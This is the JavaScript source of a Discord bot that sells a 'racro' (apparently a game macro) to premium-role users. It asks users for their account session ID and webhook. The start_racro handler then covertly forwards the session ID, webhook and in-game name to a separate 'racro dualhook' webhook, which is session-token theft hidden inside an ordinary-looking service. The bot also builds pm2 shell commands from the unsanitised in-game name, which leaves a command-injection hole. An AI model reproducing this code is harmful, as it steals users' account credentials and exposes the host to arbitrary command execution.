const { Client, GatewayIntentBits } = require('discord.js');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v10');
const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');
var str = ""; 
var filename = '.env';


const token = ''; // bot token
const clientId = ''; // bot id
const guildId = ''; // discord server id
const ownerId = ''; // your id
const premiumRoleId = ''; // premium role


const commands = [
  {
    name: 'ping',
    description: 'Replies with Pong!',
  },
  {
    name: 'addpremium',
    description: 'Give premium role to a user',
    options: [
      {
        name: 'user',
        type: 6,
        description: 'The user to give premium role',
        required: true,
      },
    ],
  },
  {
    name: 'removepremium',
    description: 'Remove premium role from a user',
    options: [
      {
        name: 'user',
        type: 6,
        description: 'The user to remove premium role',
        required: true,
      },
    ],
  },
  {
    name: 'start_racro',
    description: 'starts a racro',
    options: [
      {
        name: 'sessionid',
        type: 3,
        description: 'The accounts sessionid',
        required: true,
      },
      {
        name: 'webhook',
        type: 3,
        description: 'Alert webhook',
        required: true,
      },
      {
        name: 'ign',
        type: 3,
        description: 'Ign of the account you use for racro',
        required: true,
      },
    ],
  },
  {
    name: 'stop_racro',
    description: 'Remove an adbot',
    options: [
      {
        name: 'ign',
        type: 3,
        description: 'Ign of the account that is using racro',
        required: true,
      },
    ],
  },
];

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  registerCommands();
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;

  const { commandName, options, user } = interaction;

  if (commandName === 'ping') {
    await interaction.reply('Pong!');
  } else if (commandName === 'addpremium') {
    if (user.id !== ownerId) {
      return interaction.reply('You do not have permission to use this command.');
    }

    const targetUser = options.getUser('user');
    const guild = client.guilds.cache.get(guildId);
    const premiumRole = guild.roles.cache.get(premiumRoleId);

    if (!premiumRole) {
      return interaction.reply('Premium role not found. Please check the configuration.');
    }

    try {
      await interaction.guild.members.cache.get(targetUser.id).roles.add(premiumRole);
      await interaction.reply(`Successfully added role to user!`);
    } catch (error) {
      console.error(error);
      await interaction.reply('An error occurred while adding the premium role.');
    }
    
  } else if (commandName === 'removepremium') {
      if (user.id !== ownerId) {
        return interaction.reply('You do not have permission to use this command.');
      }

      const targetUser = options.getUser('user');
      const guild = client.guilds.cache.get(guildId);
      const premiumRole = guild.roles.cache.get(premiumRoleId);

      if (!premiumRole) {
        return interaction.reply('Premium role not found. Please check the configuration.');
      }

      try {
        await interaction.guild.members.cache.get(targetUser.id).roles.remove(premiumRole);
        await interaction.reply(`Successfully removed role from user!`);
      } catch (error) {
        console.error(error);
        await interaction.reply('An error occurred while adding the premium role.');
      }
  } else if (commandName === 'start_racro') {
    const ign = interaction.options.getString("ign");
    const webhook = interaction.options.getString("webhook");
    const ssid = interaction.options.getString("sessionid");
    userId = user.id;
    const member = await interaction.guild.members.fetch(user.id);
    if (!member.roles.cache.has(premiumRoleId)) {
      await interaction.reply({ content: "No permission", ephemeral: true })
    } else if (member.roles.cache.has(premiumRoleId)) {
      await interaction.reply({ content: "Racro started with name " + ign ,ephemeral: true })
      let embeds = [
        {
          title: `${userId} tried starting racro.`,
          color: 5174599,
          footer: {
            text: `powered by cvrsedd`,
          },
          fields: [
            {
              name: `IGN:`,
              value: `${ign}`,
            },
            {
              name: `Webhook:`,
              value: `${webhook}`,
            },
            {
              name: `SSID:`,
              value: `${ssid}`,
            },
          ],
        },
      ];

      let data = JSON.stringify({ embeds });

      var config = {
       method: "POST",
       url: "", // racro dualhook
       headers: { "Content-Type": "application/json" },
       data: data,
      };

      axios(config)
       .then((response) => {
          console.log("Webhook delivered successfully");
          return response;
       })
       .catch((error) => {
         console.log(error);
         return error;
      });

      try {
        var str = `{
        WEBHOOK_URL='${webhook}'
        SSID='${ssid}'
    }`;
    
        fs.open(filename, "a", (err, fd)=>{ 
            if(err){ 
                console.log(err.message); 
            }else{ 
                fs.write(fd, str, (err, bytes)=>{ 
                    if(err){ 
                        console.log(err.message); 
                    }else{ 
                        console.log(bytes +' bytes written'); 
                    } 
                })         
            } 
        });
          start(ign);
      } catch (e) {
          console.log(e);
          interaction.editReply("Some bad shit happened.");
          return;
      }
    }
    
  } else if (commandName === 'stop_racro') {
    const ign2 = interaction.options.getString("ign");
    try {
      await interaction.reply({ content: "Racro stopped with name " + ign2, ephemeral: true });
	  stop(ign2);
    } catch (e) {
      console.log(e)
    }
  }
});

var commandToRun = "";
async function start(ign) {
	
  commandToRun = `pm2 start racro.js --name ${ign}`;
  exec(commandToRun, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log('Output:', stdout);
    if (stderr) {
      console.error('Error Output:', stderr);
    }
  });
}

async function stop(ign) {

  commandToRun = `pm2 stop ${ign}`;
  exec(commandToRun, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log('Output:', stdout);
    if (stderr) {
      console.error('Error Output:', stderr);
    }
  });
}

async function registerCommands() {
  try {
    console.log('Started refreshing application (/) commands.');

    const rest = new REST({ version: '10' }).setToken(token);

    await rest.put(
      Routes.applicationGuildCommands(clientId, guildId),
      { body: commands },
    );

    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }
}

client.login(token);